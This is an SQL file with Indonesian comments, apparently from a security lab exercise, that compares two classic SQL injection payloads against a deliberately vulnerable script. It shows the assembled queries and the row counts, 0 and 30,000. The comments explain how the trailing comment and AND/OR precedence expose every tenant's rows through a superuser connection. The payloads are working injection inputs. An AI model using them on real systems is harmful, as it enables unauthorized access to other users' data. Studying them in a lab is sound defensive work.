-- Diminta: menjalankan payload pembanding zz' OR '1'='1 dan zz' OR '1'='1' --, menyalin
--          jumlah baris keduanya, serta menjelaskan perbedaan sintaks yang terjadi.
-- Dipilih: menjalankan kedua payload melalui rentan.py pada kontainer lab11-web dan
--          memverifikasi hasil penyusunan string SQL di PostgreSQL.
-- Alternatif: menyaring atau menghapus tanda kutip pada input pengguna; tidak dipilih karena
--             penyaringan karakter tetap menyatukan saluran perintah dan data.

-- 1. Payload tanpa komentar: zz' OR '1'='1
--    SQL terbentuk:
--    SELECT id, nama, kota FROM lab11.pelanggan WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1%'
--    Hasil nyata: 0 baris.
--    Penjelasan: Tanpa komentar '--', tanda kutip penutup dan '%' bawaan kode menempel di ujung
--    payload sehingga kondisinya menjadi '1' = '1%' (FALSE), dan tidak ada nama mengandung '%zz'.
SELECT count(*) AS payload_tanpa_komentar
FROM lab11.pelanggan
WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1%';

-- 2. Payload dengan komentar: zz' OR '1'='1' --
--    SQL terbentuk:
--    SELECT id, nama, kota FROM lab11.pelanggan WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1' --%'
--    Hasil nyata: 30000 baris.
--    Penjelasan: Tanda '--' membuang sisa kutip dan '%' di ujung sehingga '1'='1' menjadi TRUE.
--    Karena prioritas operator AND lebih tinggi dari OR, query dievaluasi sebagai
--    (tenant_id = 1 AND nama ILIKE '%zz') OR ('1'='1'), sehingga seluruh 30.000 baris lintas
--    penyewa ikut terbuka (karena koneksi berjalan sebagai postgres yang kebal RLS).
SELECT count(*) AS payload_dengan_komentar
FROM lab11.pelanggan
WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1' --%';